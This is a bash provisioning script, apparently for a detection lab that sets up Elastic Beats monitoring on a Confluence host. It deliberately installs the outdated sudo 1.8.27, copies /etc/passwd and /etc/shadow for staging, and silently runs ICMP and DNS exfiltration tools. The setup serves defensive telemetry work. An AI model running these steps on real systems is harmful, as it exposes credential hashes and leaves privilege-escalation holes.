
#!/bin/bash

# Start Confluence
/etc/init.d/confluence start

# General
apt install rsyslog -y
apt install dnsutils -y
service rsyslog start
apt-get install libpcap0.8 -y

# [BEATS SETUP]
# Setup packetbeat
curl -L -O https://artifacts.elastic.co/downloads/beats/packetbeat/packetbeat-8.3.3-amd64.deb
dpkg -i packetbeat-8.3.3-amd64.deb
cp /vagrant/config/packetbeat/packetbeat.yml /etc/packetbeat/packetbeat.yml

# Setup filebeat
curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-8.3.3-amd64.deb
dpkg -i filebeat-8.3.3-amd64.deb
filebeat modules enable system
cp /vagrant/config/filebeat/filebeat.yml /etc/filebeat/filebeat.yml
cp /vagrant/config/filebeat/system.yml /etc/filebeat/modules.d/system.yml
cp /vagrant/config/filebeat/50-default.conf /etc/rsyslog.d/50-default.conf

# Seup auditbeat
curl -L -O https://artifacts.elastic.co/downloads/beats/auditbeat/auditbeat-8.3.3-amd64.deb
dpkg -i auditbeat-8.3.3-amd64.deb
cp /vagrant/config/auditbeat/auditbeat.yml /etc/auditbeat/auditbeat.yml

#[PRIVILEGE ESCALATION]

apt update
apt install git
apt install gcc
apt install make

export SUDO_FORCE_REMOVE=yes
apt purge sudo

cd /vagrant/attack/privilegeEscalation
wget http://www.sudo.ws/dist/sudo-1.8.27.tar.gz
tar -xf sudo-1.8.27.tar.gz
cd sudo-1.8.27
./configure --prefix=/usr              \
            --libexecdir=/usr/lib      \
            --with-secure-path         \
            --with-all-insults         \
            --with-env-editor          \
            --docdir=/usr/share/doc/sudo-1.8.27 \
            --with-passprompt="[sudo] password for %p: " && make
make install && ln -sfv libsudo_util.so.0.0.0 /usr/lib/sudo/libsudo_util.so.0

#[EXFILTRATION]

#Simulate collected files
mkdir /tmp/exfiltrate
cat /etc/passwd > /tmp/exfiltrate/passwd
cat /etc/shadow > /tmp/exfiltrate/shadow
# Run qssender to exfilrate via ICMP
wget https://github.com/ariary/QueenSono/releases/latest/download/qssender -O /tmp/qssender
chmod +x /tmp/qssender
cp /vagrant/attack/exfiltration/run_qssender.sh /tmp/run_qssender.sh
chmod +x /tmp/run_qssender.sh
nohup /tmp/run_qssender.sh &>/dev/null &
# Run DNSteal to exfiltrate via DNS
cp /vagrant/attack/exfiltration/run_dnsteal.sh /tmp/run_dnsteal.sh
chmod +x /tmp/run_dnsteal.sh
nohup /tmp/run_dnsteal.sh &>/dev/null &


# Start beats
echo "Waiting for Kibana to be up, sleeping for 60s..."
sleep 60
filebeat setup -e
packetbeat setup -e
auditbeat setup -e
service filebeat start
service packetbeat start
service auditbeat start
